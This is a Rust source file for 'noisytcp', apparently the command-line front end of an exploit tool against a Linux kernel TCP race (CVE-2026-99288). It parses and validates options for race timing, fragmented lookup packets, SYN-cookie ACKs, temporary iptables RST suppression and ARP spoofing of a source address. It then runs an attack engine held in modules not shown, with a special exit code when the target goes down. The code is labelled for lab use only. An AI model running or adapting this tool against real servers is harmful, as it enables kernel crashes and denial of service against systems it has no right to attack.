// On non-Linux hosts the engine is a stub, but the CLI and the offline
// selftest stay compiled so `--help` and `--selftest` work everywhere; that
// leaves the Linux-only config fields unreferenced there.
#![cfg_attr(not(target_os = "linux"), allow(dead_code))]

mod noisy_tcp;
mod packets;

use clap::{Parser, ValueEnum};
use std::net::Ipv4Addr;

#[derive(Clone, Copy, Debug, ValueEnum)]
enum Mode {
    Probe,
    Verify,
    Race,
    /// TIME_WAIT recycle setup for targets with tcp_syncookies=2
    /// (needs a listener that accepts and closes immediately)
    Tw,
}

#[derive(Parser)]
#[command(
    name = "noisytcp",
    version,
    about = "Trigger the NoisyTCP CVE-2026-99288 IPv4 request_sock ABA race (lab use only)"
)]
struct Args {
    #[arg(help = "Target Linux server IPv4 address (own/lab systems only)")]
    ip: Option<Ipv4Addr>,

    #[arg(default_value_t = 9000, help = "Target listening TCP port")]
    port: u16,

    #[arg(long, value_enum, default_value_t = Mode::Race, help = "Operation mode; race runs probe and verify first")]
    mode: Mode,

    #[arg(long, help = "Effective listener backlog; calibrate when omitted")]
    backlog: Option<usize>,

    #[arg(
        long,
        default_value_t = 0,
        help = "Race tuples per round; 0 selects it from the backlog"
    )]
    batch: usize,

    #[arg(long, default_value_t = 1, help = "Fragmented lookup packets per shot")]
    readers: usize,

    #[arg(
        long,
        default_value_t = 0,
        help = "Race duration in seconds; 0 runs until Ctrl+C"
    )]
    duration: u64,

    #[arg(long, default_value_t = 40000, help = "First source port")]
    source_port: u16,

    #[arg(
        long,
        default_value_t = 16384,
        help = "Number of source ports available to the engine"
    )]
    source_port_count: usize,

    #[arg(
        long,
        help = "TCP bytes carried by the first lookup fragment; multiple of 8. Omitted: probe picks a working split (prefers 24)"
    )]
    frag_split: Option<usize>,

    #[arg(
        long,
        default_value_t = 16,
        help = "TCP payload bytes in fragmented lookup packets"
    )]
    payload: usize,

    #[arg(
        long,
        default_value_t = 1460,
        help = "MSS advertised in SYNs; fixes the SYN-cookie MSS index (0 omits the option)"
    )]
    mss: u16,

    #[arg(
        long,
        default_value_t = 20,
        help = "Delay between lookup fragments, microseconds"
    )]
    frag_gap_us: u64,

    #[arg(
        long,
        default_value_t = 0,
        help = "Delay between lookup completion and RST, microseconds"
    )]
    free_gap_us: u64,

    #[arg(
        long,
        default_value_t = 4,
        help = "Delay between RST and cookie ACK, microseconds"
    )]
    alloc_gap_us: u64,

    #[arg(
        long,
        default_value_t = 4,
        help = "Random delay added to each gap, microseconds"
    )]
    jitter_us: u64,

    #[arg(
        long,
        default_value_t = 5000,
        help = "SYN queue settling delay, microseconds (300 works on fast lab paths)"
    )]
    settle_us: u64,

    #[arg(
        long,
        help = "SYN-ACK timeout in milliseconds; measured automatically by default"
    )]
    synack_ms: Option<u64>,

    #[arg(long, default_value_t = 1, help = "SO_MARK value for crafted packets")]
    mark: u32,

    #[arg(
        long,
        help = "Do not install the temporary iptables RST-suppression rule"
    )]
    no_rst_filter: bool,

    #[arg(long, help = "Continue even when host-generated RSTs are detected")]
    assume_ok: bool,

    #[arg(long, help = "Do not RST the child sockets created by cookie ACKs")]
    keep_children: bool,

    #[arg(
        long,
        help = "Pin the engine, sniffer and watcher threads to distinct CPUs"
    )]
    pin: bool,

    #[arg(
        long,
        help = "Do not run the built-in target liveness watcher in race/tw modes"
    )]
    no_watch: bool,

    #[arg(
        long,
        help = "Source IPv4 to use; with --spoof it is claimed via ARP on the local segment"
    )]
    src: Option<Ipv4Addr>,

    #[arg(
        long,
        help = "Claim --src with ARP (on-link targets only); the local kernel never RSTs, no iptables needed"
    )]
    spoof: bool,

    #[arg(
        long,
        help = "Network interface for sniffing, ARP and TX (SO_BINDTODEVICE); default: from the route"
    )]
    dev: Option<String>,

    #[arg(
        long,
        help = "Build and verify sample packets offline, then exit (no root, no network)"
    )]
    selftest: bool,

    #[arg(
        long,
        help = "Build a full race round without sending anything (no root, no network; the target defaults to 192.0.2.1)"
    )]
    dry_run: bool,

    #[arg(long, help = "Print calibration and packet diagnostics")]
    debug: bool,
}

struct Config {
    target: Ipv4Addr,
    port: u16,
    mode: Mode,
    backlog: Option<usize>,
    batch: usize,
    readers: usize,
    duration: u64,
    source_port: u16,
    source_port_count: usize,
    frag_split: Option<usize>,
    payload: usize,
    mss: u16,
    frag_gap_us: u64,
    free_gap_us: u64,
    alloc_gap_us: u64,
    jitter_us: u64,
    settle_us: u64,
    synack_ms: Option<u64>,
    mark: u32,
    no_rst_filter: bool,
    assume_ok: bool,
    keep_children: bool,
    pin: bool,
    no_watch: bool,
    src: Option<Ipv4Addr>,
    spoof: bool,
    dev: Option<String>,
    dry_run: bool,
    debug: bool,
}

fn validate(args: &Args) -> Result<(), String> {
    if !args.selftest && !args.dry_run && args.ip.is_none() {
        return Err(
            "a target IPv4 address is required (only --selftest and --dry-run run without one)"
                .into(),
        );
    }
    if args.port == 0 {
        return Err("--port must be greater than zero".into());
    }
    if args.source_port == 0 {
        return Err("--source-port must be greater than zero".into());
    }
    if args.source_port_count < 1024 {
        return Err("--source-port-count must be at least 1024".into());
    }
    if usize::from(args.source_port) + args.source_port_count > 65_536 {
        return Err("--source-port plus --source-port-count exceeds the TCP port range".into());
    }
    if args.batch > 512 {
        return Err("--batch cannot exceed 512".into());
    }
    if args.readers == 0 || args.readers > 16 {
        return Err("--readers must be between 1 and 16".into());
    }
    if args.backlog == Some(0) {
        return Err("--backlog must be greater than zero".into());
    }
    if args.backlog.is_some_and(|value| value > 4096) {
        return Err("--backlog cannot exceed 4096".into());
    }
    if let Some(backlog) = args.backlog {
        let batch = if args.batch == 0 {
            backlog.min(512)
        } else {
            args.batch
        };
        if backlog + batch > args.source_port_count {
            return Err(
                "--source-port-count must be at least --backlog plus the effective --batch".into(),
            );
        }
    }
    if args.synack_ms == Some(0) {
        return Err("--synack-ms must be greater than zero".into());
    }
    if args.payload > 256 {
        return Err("--payload cannot exceed 256".into());
    }
    if let Some(split) = args.frag_split {
        if split < 8 || split % 8 != 0 {
            return Err("--frag-split must be a multiple of 8 and at least 8".into());
        }
        if split >= 20 + args.payload {
            return Err(
                "--frag-split must be smaller than the 20-byte TCP header plus --payload".into(),
            );
        }
    }
    if args.spoof && args.src.is_none() {
        return Err(
            "--spoof requires --src with a non-local address on the target's segment".into(),
        );
    }
    if args.spoof && args.dry_run {
        return Err("--spoof cannot be combined with --dry-run".into());
    }
    if args.frag_gap_us > 1_000_000
        || args.free_gap_us > 1_000_000
        || args.alloc_gap_us > 1_000_000
        || args.jitter_us > 1_000_000
        || args.settle_us > 1_000_000
    {
        return Err("microsecond delays cannot exceed 1000000".into());
    }
    Ok(())
}

fn main() {
    let args = Args::parse();
    if let Err(error) = validate(&args) {
        eprintln!("{error}");
        std::process::exit(2);
    }
    if args.selftest {
        if let Err(error) = noisy_tcp::selftest() {
            eprintln!("selftest failed: {error}");
            std::process::exit(1);
        }
        return;
    }
    let config = Config {
        target: args.ip.unwrap_or(Ipv4Addr::new(192, 0, 2, 1)),
        port: args.port,
        mode: args.mode,
        backlog: args.backlog,
        batch: args.batch,
        readers: args.readers,
        duration: args.duration,
        source_port: args.source_port,
        source_port_count: args.source_port_count,
        frag_split: args.frag_split,
        payload: args.payload,
        mss: args.mss,
        frag_gap_us: args.frag_gap_us,
        free_gap_us: args.free_gap_us,
        alloc_gap_us: args.alloc_gap_us,
        jitter_us: args.jitter_us,
        settle_us: args.settle_us,
        synack_ms: args.synack_ms,
        mark: args.mark,
        no_rst_filter: args.no_rst_filter,
        assume_ok: args.assume_ok,
        keep_children: args.keep_children,
        pin: args.pin,
        no_watch: args.no_watch,
        src: args.src,
        spoof: args.spoof,
        dev: args.dev,
        dry_run: args.dry_run,
        debug: args.debug,
    };
    if let Err(error) = noisy_tcp::run(config) {
        eprintln!("NoisyTCP failed: {error}");
        std::process::exit(1);
    }
    if noisy_tcp::target_down() {
        // distinct exit code so lab scripts can tell "target went down"
        // apart from "target survived the run"
        std::process::exit(3);
    }
}
